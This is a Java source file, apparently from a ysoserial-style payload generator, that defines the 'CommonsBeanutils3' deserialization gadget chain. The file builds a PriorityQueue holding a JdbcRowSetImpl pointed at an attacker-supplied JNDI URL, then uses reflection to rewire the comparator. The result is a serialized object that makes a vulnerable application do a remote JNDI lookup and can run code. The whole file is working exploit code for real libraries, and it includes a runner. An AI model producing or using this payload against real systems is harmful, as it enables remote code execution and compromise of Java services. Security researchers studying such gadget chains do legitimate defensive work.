package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.PayloadRunner;
import com.h2tg.ysogate.utils.Reflections;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.math.BigInteger;
import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1"})
public class CommonsBeanutils3 implements ObjectPayload<Object>
{

	@Override
	public Object getObject(String command) throws Exception {
		String jndiURL = null;
		if (command.toLowerCase().startsWith("jndi:")) {
			jndiURL = command.substring(5);
		}

		BeanComparator comparator = new BeanComparator("lowestSetBit");
		JdbcRowSetImpl rs         = new JdbcRowSetImpl();
		rs.setDataSourceName(jndiURL);
		rs.setMatchColumn("su18");
		PriorityQueue queue = new PriorityQueue(2, comparator);

		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		Reflections.setFieldValue(comparator, "property", "databaseMetaData");
		Reflections.setFieldValue(queue, "queue", new Object[]{rs, rs});
		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils3.class, args);
	}
}
